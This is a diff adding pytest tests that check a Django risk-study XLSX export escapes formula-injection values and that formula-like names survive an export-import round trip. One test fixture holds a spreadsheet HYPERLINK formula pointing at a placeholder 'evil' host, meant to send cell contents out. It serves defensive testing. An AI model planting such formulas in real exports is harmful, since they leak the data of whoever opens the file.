@@ -65,6 +65,70 @@ def test_export_xlsx_sanitizes_audit_sheet_name(
 
 
 @pytest.mark.django_db
+def test_export_xlsx_escapes_formula_injection(
+    admin_client, basic_ebios_rm_study_fixture
+):
+    study = basic_ebios_rm_study_fixture
+    study.name = '=HYPERLINK("https://evil/?d="&A1,"click")'
+    study.description = "-2+3"
+    study.save()
+
+    response = admin_client.get(f"/api/ebios-rm/studies/{study.id}/export-xlsx/")
+
+    assert response.status_code == 200
+    ws = openpyxl.load_workbook(io.BytesIO(response.content))["1.1 Study"]
+    headers = [c.value for c in ws[1]]
+    name_cell = ws.cell(row=2, column=headers.index("name") + 1)
+    desc_cell = ws.cell(row=2, column=headers.index("description") + 1)
+    assert name_cell.data_type == "s"
+    assert desc_cell.data_type == "s"
+    assert name_cell.value.startswith("'=")
+    assert desc_cell.value.startswith("'-")
+
+
+@pytest.mark.django_db
+def test_export_import_round_trips_formula_like_values(
+    admin_client, basic_ebios_rm_study_fixture
+):
+    study = basic_ebios_rm_study_fixture
+    root = Folder.get_root_folder()
+    ra = RiskAssessment.objects.create(
+        name="=SUM(A1:A2) assessment",
+        ref_id="RA.1",
+        version="1",
+        folder=root,
+        risk_matrix=study.risk_matrix,
+        ebios_rm_study=study,
+    )
+    RiskScenario.objects.create(
+        risk_assessment=ra,
+        name="-dash scenario",
+        ref_id="R.1",
+        treatment="mitigate",
+    )
+
+    export = admin_client.get(f"/api/ebios-rm/studies/{study.id}/export-xlsx/")
+    assert export.status_code == 200
+
+    target = Folder.objects.create(name="Imported-esc", parent_folder=root)
+    response = admin_client.post(
+        "/api/data-wizard/load-file/",
+        data=export.content,
+        content_type="application/octet-stream",
+        HTTP_X_MODEL_TYPE="EbiosRMStudyExcel",
+        HTTP_X_FOLDER_ID=str(target.id),
+        HTTP_X_MATRIX_ID=str(study.risk_matrix.id),
+        HTTP_CONTENT_DISPOSITION="attachment; filename=study.xlsx",
+    )
+    assert response.status_code == 200, response.content
+    assert response.json()["results"]["successful"] == 1
+
+    imported = EbiosRMStudy.objects.get(folder=target)
+    rs = imported.last_risk_assessment.risk_scenarios.get()
+    assert rs.name == "-dash scenario"
+
+
+@pytest.mark.django_db
 def test_export_import_round_trips_workshop_5(
     admin_client, basic_ebios_rm_study_fixture
 ):
